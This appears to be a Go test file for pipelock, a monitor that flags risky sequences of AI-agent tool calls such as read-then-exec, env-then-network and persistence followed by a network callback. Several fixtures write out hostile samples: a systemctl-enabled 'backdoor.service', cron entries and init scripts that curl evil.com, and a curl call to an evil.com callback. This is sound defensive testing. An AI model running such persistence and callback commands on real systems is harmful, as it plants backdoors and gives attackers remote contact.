@@ -1,0 +1,1197 @@
+// Copyright 2026 Josh Waldrep
+// SPDX-License-Identifier: Apache-2.0
+
+package chains
+
+import (
+	"sync"
+	"testing"
+	"time"
+
+	"github.com/luckyPipewrench/pipelock/internal/config"
+)
+
+const (
+	patReadThenExec = "read-then-exec"
+	patWritePersist = "write-persist"
+	patPersistCB    = "persist-callback"
+	sevCritical     = "critical"
+)
+
+func intPtr(v int) *int { return &v }
+
+func TestSubsequenceMatch(t *testing.T) {
+	// Basic subsequence: [read, exec] should match in [read, exec]
+	history := []toolCallRecord{
+		{category: "read", name: "read_file"},
+		{category: "exec", name: "bash_command"},
+	}
+	pat := pattern{
+		name:     patReadThenExec,
+		sequence: []string{"read", "exec"},
+		severity: "high",
+		action:   config.ActionWarn,
+	}
+	if !subsequenceMatch(history, pat.sequence, 3) {
+		t.Error("expected subsequence match for [read, exec] in [read, exec]")
+	}
+
+	// With intervening calls: [read, list, exec] should match [read, exec] with max_gap=3
+	history2 := []toolCallRecord{
+		{category: "read", name: "read_file"},
+		{category: "list", name: "list_files"},
+		{category: "exec", name: "bash_exec"},
+	}
+	if !subsequenceMatch(history2, pat.sequence, 3) {
+		t.Error("expected subsequence match for [read, exec] in [read, list, exec] with gap=3")
+	}
+
+	// Three-step pattern
+	pat3 := pattern{
+		name:     "read-write-send",
+		sequence: []string{"read", "write", "network"},
+		severity: "critical",
+		action:   config.ActionWarn,
+	}
+	history3 := []toolCallRecord{
+		{category: "read", name: "read_file"},
+		{category: "write", name: "write_file"},
+		{category: "network", name: "send_request"},
+	}
+	if !subsequenceMatch(history3, pat3.sequence, 3) {
+		t.Error("expected subsequence match for [read, write, network]")
+	}
+}
+
+func TestSubsequenceMatch_MaxGap(t *testing.T) {
+	// Gap of 1: [read, list, exec] should match [read, exec] with max_gap=1
+	history := []toolCallRecord{
+		{category: "read", name: "read_file"},
+		{category: "list", name: "list_files"},
+		{category: "exec", name: "bash_command"},
+	}
+	seq := []string{"read", "exec"}
+	if !subsequenceMatch(history, seq, 1) {
+		t.Error("expected match with gap=1")
+	}
+
+	// Gap of 2 (exceeds max_gap=1): should NOT match
+	history2 := []toolCallRecord{
+		{category: "read", name: "read_file"},
+		{category: "list", name: "list_files"},
+		{category: "list", name: "list_dirs"},
+		{category: "exec", name: "bash_command"},
+	}
+	if subsequenceMatch(history2, seq, 1) {
+		t.Error("should NOT match with gap=2 when max_gap=1")
+	}
+
+	// Gap of 0 (strict adjacency): only matches if consecutive
+	if !subsequenceMatch([]toolCallRecord{
+		{category: "read", name: "r"},
+		{category: "exec", name: "e"},
+	}, seq, 0) {
+		t.Error("expected match with gap=0 for adjacent entries")
+	}
+
+	if subsequenceMatch([]toolCallRecord{
+		{category: "read", name: "r"},
+		{category: "list", name: "l"},
+		{category: "exec", name: "e"},
+	}, seq, 0) {
+		t.Error("should NOT match with gap=1 when max_gap=0")
+	}
+}
+
+func TestSubsequenceMatch_NoMatch(t *testing.T) {
+	// Missing step
+	history := []toolCallRecord{
+		{category: "read", name: "read_file"},
+		{category: "list", name: "list_files"},
+	}
+	seq := []string{"read", "exec"}
+	if subsequenceMatch(history, seq, 10) {
+		t.Error("should not match when step is missing")
+	}
+
+	// Wrong order
+	history2 := []toolCallRecord{
+		{category: "exec", name: "bash_exec"},
+		{category: "read", name: "read_file"},
+	}
+	if subsequenceMatch(history2, seq, 10) {
+		t.Error("should not match when steps are in wrong order")
+	}
+
+	// Empty history
+	if subsequenceMatch(nil, seq, 10) {
+		t.Error("should not match on empty history")
+	}
+
+	// Empty pattern
+	if subsequenceMatch(history, nil, 10) {
+		t.Error("should not match on empty pattern")
+	}
+}
+
+func TestBuiltInPatterns(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+
+	m := New(cfg)
+
+	// Verify all 10 built-in patterns exist.
+	expectedPatterns := map[string]struct{}{
+		patReadThenExec:        {},
+		"read-write-send":      {},
+		"env-then-network":     {},
+		"directory-scan":       {},
+		"write-execute":        {},
+		"write-chmod-execute":  {},
+		"read-sensitive-write": {},
+		"shell-burst":          {},
+		patWritePersist:        {},
+		patPersistCB:           {},
+	}
+
+	if len(m.patterns) < len(expectedPatterns) {
+		t.Errorf("expected at least %d built-in patterns, got %d", len(expectedPatterns), len(m.patterns))
+	}
+
+	found := make(map[string]bool)
+	for _, p := range m.patterns {
+		found[p.name] = true
+	}
+	for name := range expectedPatterns {
+		if !found[name] {
+			t.Errorf("missing built-in pattern %q", name)
+		}
+	}
+}
+
+func TestMatcher_Record(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// Record a read followed by exec - should match patReadThenExec
+	v1 := m.Record("session1", "read_file")
+	if v1.Matched {
+		t.Error("single read should not match any pattern")
+	}
+
+	v2 := m.Record("session1", "bash_command")
+	if !v2.Matched {
+		t.Error("read + exec should match read-then-exec pattern")
+	}
+	if v2.PatternName != patReadThenExec {
+		t.Errorf("expected pattern read-then-exec, got %q", v2.PatternName)
+	}
+	if v2.Severity != "high" {
+		t.Errorf("expected severity high, got %q", v2.Severity)
+	}
+	if v2.Action != config.ActionWarn {
+		t.Errorf("expected action warn, got %q", v2.Action)
+	}
+}
+
+func TestMatcher_WindowEviction(t *testing.T) {
+	// Test count-based eviction
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    3, // Very small window
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// Fill window with reads, then overflow
+	m.Record("s1", "read_file")
+	m.Record("s1", "list_files")
+	m.Record("s1", "list_dirs")
+	// Window is now full (3 entries). Next entry should evict oldest.
+	m.Record("s1", "run_command")
+
+	// Add another entry; the oldest (read_file) should have been evicted.
+	_ = m.Record("s1", "bash_exec")
+	// Verify eviction by checking history size.
+	sh, ok := m.sessions.Load("s1")
+	if !ok {
+		t.Fatal("session not found")
+	}
+	sess := sh.(*sessionHistory)
+	sess.mu.Lock()
+	count := len(sess.records)
+	sess.mu.Unlock()
+	if count > 3 {
+		t.Errorf("expected at most %d records, got %d", 3, count)
+	}
+
+	// Test time-based eviction
+	cfg2 := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    100,
+		WindowSeconds: 1, // 1 second window
+		MaxGap:        intPtr(3),
+	}
+	m2 := New(cfg2)
+
+	m2.Record("s2", "read_file")
+	sh2, ok := m2.sessions.Load("s2")
+	if !ok {
+		t.Fatal("session s2 not found")
+	}
+	sess2 := sh2.(*sessionHistory)
+	sess2.mu.Lock()
+	for i := range sess2.records {
+		sess2.records[i].timestamp = time.Now().Add(-2 * time.Second)
+	}
+	sess2.mu.Unlock()
+
+	// The read should be evicted. New exec should not match read-then-exec.
+	v := m2.Record("s2", "bash_command")
+	if v.Matched && v.PatternName == patReadThenExec {
+		t.Error("stale read should have been evicted by time window")
+	}
+	_ = v
+}
+
+func TestMatcher_CustomPatterns(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(5),
+		CustomPatterns: []config.ChainPattern{
+			{
+				Name:     "custom-read-list-write",
+				Sequence: []string{"read", "list", "write"},
+				Severity: "critical", // critical so it beats built-in "read-sensitive-write" (medium)
+			},
+		},
+	}
+	m := New(cfg)
+
+	m.Record("s1", "read_file")
+	m.Record("s1", "list_files")
+	v := m.Record("s1", "write_file")
+
+	if !v.Matched {
+		t.Error("expected custom pattern to match")
+	}
+	// The built-in "read-sensitive-write" (medium) also matches, but custom
+	// pattern has critical severity, so it wins.
+	if v.PatternName != "custom-read-list-write" {
+		t.Errorf("expected custom-read-list-write, got %q", v.PatternName)
+	}
+	if v.Severity != sevCritical {
+		t.Errorf("expected severity critical, got %q", v.Severity)
+	}
+}
+
+func TestMatcher_PatternOverrides(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+		PatternOverrides: map[string]string{
+			patReadThenExec: config.ActionBlock,
+		},
+	}
+	m := New(cfg)
+
+	m.Record("s1", "read_file")
+	v := m.Record("s1", "bash_command")
+
+	if !v.Matched {
+		t.Error("expected match")
+	}
+	if v.Action != config.ActionBlock {
+		t.Errorf("expected action block from pattern override, got %q", v.Action)
+	}
+}
+
+func TestMatcher_HighestSeverity(t *testing.T) {
+	// Create a scenario where multiple patterns match simultaneously.
+	// read-write-send (critical) and read-sensitive-write (medium)
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(5),
+	}
+	m := New(cfg)
+
+	m.Record("s1", "read_file")
+	m.Record("s1", "write_file")
+	v := m.Record("s1", "send_request")
+
+	if !v.Matched {
+		t.Error("expected match")
+	}
+	// read-write-send is critical, read-sensitive-write is medium.
+	// Should return the highest severity.
+	if v.Severity != sevCritical {
+		t.Errorf("expected critical severity (highest), got %q", v.Severity)
+	}
+}
+
+func TestMatcher_UnknownCategory(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// Unknown tools should not be recorded
+	v := m.Record("s1", "foobar_baz")
+	if v.Matched {
+		t.Error("unknown tool should not match")
+	}
+
+	// Verify it wasn't recorded in the session
+	sh, ok := m.sessions.Load("s1")
+	if ok {
+		sess := sh.(*sessionHistory)
+		sess.mu.Lock()
+		count := len(sess.records)
+		sess.mu.Unlock()
+		if count != 0 {
+			t.Errorf("unknown tool should not be recorded, got %d records", count)
+		}
+	}
+	// ok=false is also acceptable (no session created yet)
+}
+
+func TestMatcher_Concurrent(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    100,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	var wg sync.WaitGroup
+	for i := range 50 {
+		wg.Add(1)
+		go func(_ int) {
+			defer wg.Done()
+			session := "session-concurrent"
+			m.Record(session, "read_file")
+			m.Record(session, "bash_command")
+			m.Record(session, "list_files")
+			m.Record(session, "write_file")
+			m.Record(session, "send_request")
+		}(i)
+	}
+	wg.Wait()
+
+	// Just verify no panics/races occurred. The -race flag will catch data races.
+}
+
+func TestMatcher_SessionIsolation(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// Session A: record read
+	m.Record("sessionA", "read_file")
+
+	// Session B: record exec - should NOT match read-then-exec because
+	// the read was in a different session.
+	v := m.Record("sessionB", "bash_command")
+	if v.Matched {
+		t.Error("sessions should be isolated: exec in sessionB should not see read from sessionA")
+	}
+
+	// Session A: record exec - SHOULD match because both are in sessionA
+	v2 := m.Record("sessionA", "bash_command")
+	if !v2.Matched {
+		t.Error("read + exec in same session should match")
+	}
+}
+
+func TestMatcher_NilSafe(t *testing.T) {
+	// Disabled config should create a no-op matcher
+	cfg := &config.ToolChainDetection{
+		Enabled: false,
+	}
+	m := New(cfg)
+
+	v := m.Record("s1", "read_file")
+	if v.Matched {
+		t.Error("disabled matcher should never match")
+	}
+}
+
+func TestMatcher_CustomPatternAction(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+		CustomPatterns: []config.ChainPattern{
+			{
+				Name:     "custom-block-pattern",
+				Sequence: []string{"env", "network"},
+				Severity: "critical",
+				Action:   config.ActionBlock,
+			},
+		},
+	}
+	m := New(cfg)
+
+	m.Record("s1", "env_get")
+	v := m.Record("s1", "fetch_url")
+
+	if !v.Matched {
+		t.Error("expected match")
+	}
+	// Both custom and built-in "env-then-network" match. The custom has
+	// action=block, the built-in has action=warn. Block should win.
+	if v.Action != config.ActionBlock {
+		t.Errorf("expected block (strictest action), got %q", v.Action)
+	}
+}
+
+func TestMatcher_MaxGapRetry(t *testing.T) {
+	// Test that when the first occurrence of step[0] fails due to gap,
+	// the matcher tries the next occurrence of step[0].
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(1),
+	}
+	m := New(cfg)
+
+	// First read, then too many gaps before exec
+	m.Record("s1", "read_file")    // read at pos 0
+	m.Record("s1", "list_files")   // gap 1
+	m.Record("s1", "list_files")   // gap 2 - too many
+	m.Record("s1", "read_file")    // read at pos 3 - retry start
+	m.Record("s1", "bash_command") // exec at pos 4 - gap 0 from pos 3
+
+	// Should match starting from the second read
+	sh, _ := m.sessions.Load("s1")
+	sess := sh.(*sessionHistory)
+	sess.mu.Lock()
+	matched := subsequenceMatch(sess.records, []string{"read", "exec"}, 1)
+	sess.mu.Unlock()
+	if !matched {
+		t.Error("should match using second occurrence of step[0]")
+	}
+}
+
+func TestMatcher_NilConfig(t *testing.T) {
+	// nil config should produce a no-op matcher (not panic).
+	m := New(nil)
+	v := m.Record("s1", "read_file")
+	if v.Matched {
+		t.Error("nil config matcher should never match")
+	}
+}
+
+func TestMatcher_WithMetrics(t *testing.T) {
+	var recorded []string
+	recorder := &stubMetrics{recordFn: func(p, s, a string) {
+		recorded = append(recorded, p+":"+s+":"+a)
+	}}
+
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg).WithMetrics(recorder)
+
+	m.Record("s1", "read_file")
+	m.Record("s1", "bash_command")
+
+	if len(recorded) == 0 {
+		t.Fatal("expected metrics recording on chain match")
+	}
+	if recorded[0] != "read-then-exec:high:warn" {
+		t.Errorf("unexpected metric: %s", recorded[0])
+	}
+}
+
+type stubMetrics struct {
+	recordFn func(pattern, severity, action string)
+}
+
+func (s *stubMetrics) RecordChainDetection(pattern, severity, action string) {
+	s.recordFn(pattern, severity, action)
+}
+
+func TestMatcher_CustomPatternOverride(t *testing.T) {
+	// Custom pattern with PatternOverrides should use the override action.
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+		CustomPatterns: []config.ChainPattern{
+			{
+				Name:     "my-custom",
+				Sequence: []string{"read", "write"},
+				Severity: "medium",
+				Action:   config.ActionWarn,
+			},
+		},
+		PatternOverrides: map[string]string{
+			"my-custom": config.ActionBlock,
+		},
+	}
+	m := New(cfg)
+
+	m.Record("s1", "read_file")
+	v := m.Record("s1", "write_file")
+
+	if !v.Matched {
+		t.Fatal("expected match")
+	}
+	if v.Action != config.ActionBlock {
+		t.Errorf("expected override action %q, got %q", config.ActionBlock, v.Action)
+	}
+}
+
+func TestMatcher_ClearSession(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// Record read_file - first step of patReadThenExec.
+	v := m.Record("s1", "read_file")
+	if v.Matched {
+		t.Fatal("single read should not match")
+	}
+
+	// Clear the session, wiping the read history.
+	m.ClearSession("s1")
+
+	// Now record exec - should NOT match because read was cleared.
+	v = m.Record("s1", "bash_command")
+	if v.Matched {
+		t.Error("expected no match after ClearSession wiped history")
+	}
+}
+
+func TestMatcher_ClearSession_NonExistent(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// Should not panic on a key that was never recorded.
+	m.ClearSession("no-such-session")
+}
+
+func TestMatcher_ClearSession_IndependentSessions(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// Record read in both sessions.
+	m.Record("s1", "read_file")
+	m.Record("s2", "read_file")
+
+	// Clear only s1.
+	m.ClearSession("s1")
+
+	// s1: exec should NOT match (history cleared).
+	v1 := m.Record("s1", "bash_command")
+	if v1.Matched {
+		t.Error("s1 should not match after ClearSession")
+	}
+
+	// s2: exec SHOULD match (unaffected by s1's clear).
+	v2 := m.Record("s2", "bash_command")
+	if !v2.Matched {
+		t.Error("s2 should still match — ClearSession(s1) should not affect s2")
+	}
+	if v2.PatternName != patReadThenExec {
+		t.Errorf("expected read-then-exec, got %q", v2.PatternName)
+	}
+}
+
+// --- Persist category and new patterns ---
+
+func TestClassifyTool_PersistCategory(t *testing.T) {
+	cfg := &config.ToolChainDetection{Enabled: true}
+	tests := []struct {
+		toolName string
+		want     string
+	}{
+		{"crontab_edit", "persist"},
+		{"systemctl_enable", "persist"},
+		{"systemd_service_create", "persist"},
+		{"cron_add_job", "persist"},
+		{"launchd_register", "persist"},
+		{"launchctl_load", "persist"},
+		{"launchctl_enable", "persist"},
+		{"autostart_add", "persist"},
+		// Read-indicator segments downgrade persist to a lower-priority category.
+		{"systemd_status", "unknown"},
+		{"launchctl_list", "list"},
+		{"cron_list", "list"},
+		{"systemctl_show", "unknown"},
+		{"cron_get_jobs", "read"},
+		{"launchctl_info", "unknown"},
+		// Should NOT be persist (other categories):
+		{"read_file", "read"},
+		{"bash_exec", "exec"},
+		{"curl_fetch", "network"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.toolName, func(t *testing.T) {
+			got := classifyTool(tt.toolName, cfg)
+			if got != tt.want {
+				t.Errorf("classifyTool(%q) = %q, want %q", tt.toolName, got, tt.want)
+			}
+		})
+	}
+}
+
+func TestMatcher_WritePersistPattern(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// write a unit file, then enable it via systemctl
+	v1 := m.Record("default", "write_file")
+	if v1.Matched {
+		t.Error("single write should not match")
+	}
+	v2 := m.Record("default", "systemctl_enable")
+	if !v2.Matched {
+		t.Error("expected write-persist match after write_file -> systemctl_enable")
+	}
+	if v2.PatternName != patWritePersist {
+		t.Errorf("expected write-persist pattern, got %q", v2.PatternName)
+	}
+	if v2.Severity != sevCritical {
+		t.Errorf("expected critical severity, got %q", v2.Severity)
+	}
+}
+
+func TestMatcher_PersistCallbackPattern(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// enable a service, then establish a network callback
+	m.Record("default", "crontab_edit")
+	v := m.Record("default", "curl_request")
+	if !v.Matched {
+		t.Error("expected persist-callback match after crontab -> curl")
+	}
+	if v.PatternName != patPersistCB {
+		t.Errorf("expected persist-callback pattern, got %q", v.PatternName)
+	}
+}
+
+func TestMatcher_WritePersistViaBashArgs(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// write_file followed by bash with persistence command in arguments
+	m.Record("default", "write_file")
+	argHint := `{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"bash","arguments":{"command":"systemctl enable backdoor.service"}}}`
+	v := m.Record("default", "bash", argHint)
+	if !v.Matched {
+		t.Error("expected write-persist match for write_file -> bash(systemctl enable)")
+	}
+	if v.PatternName != patWritePersist {
+		t.Errorf("expected write-persist pattern, got %q", v.PatternName)
+	}
+}
+
+func TestMatcher_BashCrontabReclassifiesAsPersist(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// crontab -e via bash should be classified as persist, not exec
+	argHint := `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"bash","arguments":{"command":"crontab -e"}}}`
+	m.Record("default", "bash", argHint)
+	callbackArg := `{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"curl","arguments":{"url":"http://evil.com/callback"}}}`
+	v := m.Record("default", "curl", callbackArg)
+	if !v.Matched {
+		t.Error("expected persist-callback match for bash(crontab -e) -> curl")
+	}
+	if v.PatternName != patPersistCB {
+		t.Errorf("expected persist-callback pattern, got %q", v.PatternName)
+	}
+}
+
+func TestMatcher_BashNoArgHintStaysExec(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// bash without argHint should classify as exec (backward compat)
+	m.Record("default", "write_file")
+	v := m.Record("default", "bash")
+	if v.Matched && v.PatternName == patWritePersist {
+		t.Error("bash without argHint should classify as exec, not persist")
+	}
+}
+
+func TestReclassifyByArgs(t *testing.T) {
+	tests := []struct {
+		name     string
+		category string
+		argHint  string
+		want     string
+	}{
+		{"exec with systemctl enable", "exec", "systemctl enable foo", "persist"},
+		{"exec with systemctl --user enable", "exec", "systemctl --user enable foo", "persist"},
+		{"exec with crontab -e", "exec", "crontab -e", "persist"},
+		{"exec with crontab file", "exec", "crontab /tmp/cron.txt", "persist"},
+		{"exec with crontab -u root file", "exec", "crontab -u root /tmp/evil.cron", "persist"},
+		{"exec with crontab -u root -e", "exec", "crontab -u root -e", "persist"},
+		{"exec with systemctl -q enable", "exec", "systemctl -q enable evil.service", "persist"},
+		{"exec with launchctl load", "exec", "launchctl load /Library/LaunchDaemons/evil.plist", "persist"},
+		{"exec with safe command", "exec", "ls -la /tmp", "exec"},
+		{"exec with crontab -l", "exec", "crontab -l", "exec"},
+		{"exec with systemctl status", "exec", "systemctl status nginx", "exec"},
+		// Bare path reads must NOT reclassify as persist (handled by policy rules instead).
+		{"exec with cat cron.d", "exec", "cat /etc/cron.d/backup", "exec"},
+		{"exec with grep cron.daily", "exec", "grep foo /etc/cron.daily/task", "exec"},
+		{"exec with cat systemd unit", "exec", "cat /etc/systemd/system/sshd.service", "exec"},
+		{"read category unchanged", "read", "systemctl enable foo", "read"},
+		{"write category unchanged", "write", "crontab -e", "write"},
+		{"empty argHint", "exec", "", "exec"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := reclassifyByArgs(tt.category, tt.argHint)
+			if got != tt.want {
+				t.Errorf("reclassifyByArgs(%q, %q) = %q, want %q", tt.category, tt.argHint, got, tt.want)
+			}
+		})
+	}
+}
+
+func TestMatcher_PersistCategory_NoFalsePositive(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// Two reads should not trigger persist patterns.
+	m.Record("default", "read_config")
+	v := m.Record("default", "read_file")
+	if v.Matched && (v.PatternName == patWritePersist || v.PatternName == patPersistCB) {
+		t.Errorf("unexpected persist pattern match: %q", v.PatternName)
+	}
+}
+
+func TestMatcher_ReadOnlyPersistToolNoFalseCallback(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// systemd_status is a read-only tool; should NOT classify as persist.
+	// A follow-up network call must NOT trigger persist-callback.
+	m.Record("default", "systemd_status")
+	v := m.Record("default", "curl_request")
+	if v.Matched && v.PatternName == patPersistCB {
+		t.Error("systemd_status -> curl should not trigger persist-callback")
+	}
+}
+
+func TestMatcher_ReadOnlyLaunchctlNoFalseCallback(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// launchctl_list is read-only; should classify as "list", not "persist".
+	m.Record("default", "launchctl_list")
+	v := m.Record("default", "curl_request")
+	if v.Matched && v.PatternName == patPersistCB {
+		t.Error("launchctl_list -> curl should not trigger persist-callback")
+	}
+}
+
+// --- Gauntlet regression tests ---
+
+func TestMatcher_GauntletEnvThenNetwork(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionBlock,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// Gauntlet case mcp-chain-env-network-002:
+	// get_env (env category) → fetch (network category)
+	m.Record("default", "get_env")
+	v := m.Record("default", "fetch")
+	if !v.Matched {
+		t.Fatal("expected env-then-network match for get_env → fetch")
+	}
+	if v.PatternName != "env-then-network" {
+		t.Errorf("expected env-then-network, got %q", v.PatternName)
+	}
+}
+
+func TestMatcher_GauntletWriteExecute(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionBlock,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// Gauntlet case mcp-chain-write-execute-003:
+	// write_file (write category) → run_command (exec category)
+	m.Record("default", "write_file")
+	v := m.Record("default", "run_command")
+	if !v.Matched {
+		t.Fatal("expected write-execute match for write_file → run_command")
+	}
+	if v.PatternName != "write-execute" {
+		t.Errorf("expected write-execute, got %q", v.PatternName)
+	}
+}
+
+func TestMatcher_GauntletPersistCallback(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionBlock,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// Gauntlet case mcp-chain-persist-callback-006:
+	// write_file to crontab path (reclassified write → persist) → fetch (network)
+	cronArgs := `{"path":"/var/spool/cron/crontabs/user","content":"*/5 * * * * curl evil.com"}`
+	m.Record("default", "write_file", cronArgs)
+	v := m.Record("default", "fetch")
+	if !v.Matched {
+		t.Fatal("expected persist-callback match for write_file(crontab) → fetch")
+	}
+	if v.PatternName != patPersistCB {
+		t.Errorf("expected persist-callback, got %q", v.PatternName)
+	}
+}
+
+func TestMatcher_WriteFileToCronPath_ClassifiesAsPersist(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionBlock,
+		WindowSize:    20,
+		WindowSeconds: 60,
+	}
+	m := New(cfg)
+
+	// write_file to /etc/cron.d/ should also classify as persist.
+	cronArgs := `{"path":"/etc/cron.d/backdoor","content":"* * * * * evil"}`
+	m.Record("default", "write_file", cronArgs)
+	v := m.Record("default", "fetch")
+	if !v.Matched || v.PatternName != patPersistCB {
+		t.Errorf("expected persist-callback for write to /etc/cron.d/, got matched=%v pattern=%q", v.Matched, v.PatternName)
+	}
+}
+
+func TestMatcher_WriteFileToSystemdUserPath_ClassifiesAsPersist(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionBlock,
+		WindowSize:    20,
+		WindowSeconds: 60,
+	}
+	m := New(cfg)
+
+	args := `{"path":"~/.config/systemd/user/backdoor.service","content":"[Service]\nExecStart=/bin/evil"}`
+	m.Record("default", "write_file", args)
+	v := m.Record("default", "fetch")
+	if !v.Matched || v.PatternName != patPersistCB {
+		t.Errorf("expected persist-callback for write to ~/.config/systemd/user/, got matched=%v pattern=%q", v.Matched, v.PatternName)
+	}
+}
+
+func TestMatcher_WriteFileToInitD_ClassifiesAsPersist(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionBlock,
+		WindowSize:    20,
+		WindowSeconds: 60,
+	}
+	m := New(cfg)
+
+	args := `{"path":"/etc/init.d/backdoor","content":"#!/bin/sh\ncurl evil.com"}`
+	m.Record("default", "write_file", args)
+	v := m.Record("default", "fetch")
+	if !v.Matched || v.PatternName != patPersistCB {
+		t.Errorf("expected persist-callback for write to /etc/init.d/, got matched=%v pattern=%q", v.Matched, v.PatternName)
+	}
+}
+
+func TestMatcher_WriteFileNonPersistPath_StaysWrite(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionBlock,
+		WindowSize:    20,
+		WindowSeconds: 60,
+	}
+	m := New(cfg)
+
+	// write_file to /tmp/ should stay as "write", not reclassify to "persist".
+	tmpArgs := `{"path":"/tmp/notes.txt","content":"hello"}`
+	m.Record("s-fp", "write_file", tmpArgs)
+	v := m.Record("s-fp", "fetch")
+	if v.Matched && v.PatternName == patPersistCB {
+		t.Error("write to /tmp/ should not trigger persist-callback")
+	}
+}
+
